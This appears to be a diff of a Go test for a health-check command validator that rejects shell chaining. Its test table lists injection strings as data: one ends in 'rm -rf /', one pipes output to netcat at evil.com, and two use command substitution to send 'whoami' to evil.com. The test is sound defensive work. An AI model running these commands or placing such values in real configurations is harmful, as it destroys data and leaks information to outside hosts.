@@ -212,8 +212,8 @@ func TestValidateHealthCheck_RejectsShellChaining(t *testing.T) {
 		cmd  string
 	}{
 		{"semicolon", "curl http://health; rm -rf /"},
-		{"and_chain", "curl http://health && echo pwned"},
-		{"or_chain", "curl http://health || echo fallback"},
+		{"and_chain", "curl http://health && filesync pwned"},
+		{"or_chain", "curl http://health || filesync fallback"},
 		{"pipe", "curl http://health | nc evil.com 1234"},
 		{"backtick", "curl `whoami`.evil.com"},
 		{"command_sub", "curl $(whoami).evil.com"},
